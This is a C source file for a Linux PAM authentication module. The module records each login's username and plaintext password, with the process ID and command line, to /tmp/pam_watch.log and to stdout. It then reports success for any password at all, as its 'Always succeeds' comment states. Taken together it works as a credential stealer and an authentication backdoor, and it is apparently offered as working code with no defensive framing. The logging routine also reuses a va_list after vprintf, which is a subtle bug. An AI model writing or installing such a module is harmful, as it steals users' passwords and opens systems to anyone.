#include <errno.h>
#include <pwd.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>

static int report(const char *fmt, ...) {
  const char fname[] = "/tmp/pam_watch.log";
  FILE *pf = fopen(fname, "a");
  if (NULL == pf) {
    fprintf(stderr, "Unable to open file %s: %s\n", fname, strerror(errno));
    return -1;
  }
  va_list ap;
  va_start(ap, fmt);
  vprintf(fmt, ap);
  if (vfprintf(pf, fmt, ap) < 0) {
    fprintf(stderr, "Unable to write file %s: %s\n", fname, strerror(errno));
    va_end(ap);
    fclose(pf);
    return -1;
  }
  va_end(ap);
  if (fclose(pf) != 0) {
    fprintf(stderr, "Unable to close file %s: %s\n", fname, strerror(errno));
    return -1;
  }
  return 0;
}

static int get_cmdline(pid_t pid, char *buf, size_t len) {
  char fname[BUFSIZ];
  snprintf(fname, sizeof fname, "/proc/%d/cmdline", pid);
  FILE *fd = fopen(fname, "r");
  if (NULL == fd) {
    fprintf(stderr, "Unable to open file %s: %s\n", fname, strerror(errno));
    return -1;
  }
  if (0 == fread(buf, 1, len, fd)) {
    fprintf(stderr, "Unable to read file %s: %s\n", fname, strerror(errno));
    fclose(fd);
    return -1;
  }
  if (fclose(fd) != 0) {
    fprintf(stderr, "Unable to close file %s: %s\n", fname, strerror(errno));
    return -1;
  }
  return 0;
}

PAM_EXTERN int pam_sm_authenticate(
  pam_handle_t *handle,
  int flags,
  int argc,
  const char **argv) {
  (void)flags;
  (void)argc;
  (void)argv;
  const char *pass;
  const char *user;
  int rc = pam_get_user(handle, &user, NULL);
  if (rc != PAM_SUCCESS) {
    report("Unable to read user name: %s\n", pam_strerror(handle, rc));
    return rc;
  }
  struct passwd *pwd = getpwnam(user);
  if (NULL == pwd) {
    report("Unknown user %s\n", user);
    return PAM_USER_UNKNOWN;
  }
  rc = pam_get_authtok(handle, PAM_AUTHTOK, &pass, NULL);
  if (rc != PAM_SUCCESS) {
    report("Unable to read pass for user %s: %s\n",
        user, pam_strerror(handle, rc));
    return rc;
  }
  // Always succeeds.
  pid_t pid = getpid();
  char cmdline[BUFSIZ];
  rc = get_cmdline(pid, cmdline, sizeof cmdline);
  if (rc < 0) {
    return PAM_SUCCESS;
  }
  report("user:%s, pass:%s, pid:%d, cmd:%s.\n", user, pass, pid, cmdline);
  return PAM_SUCCESS;
}
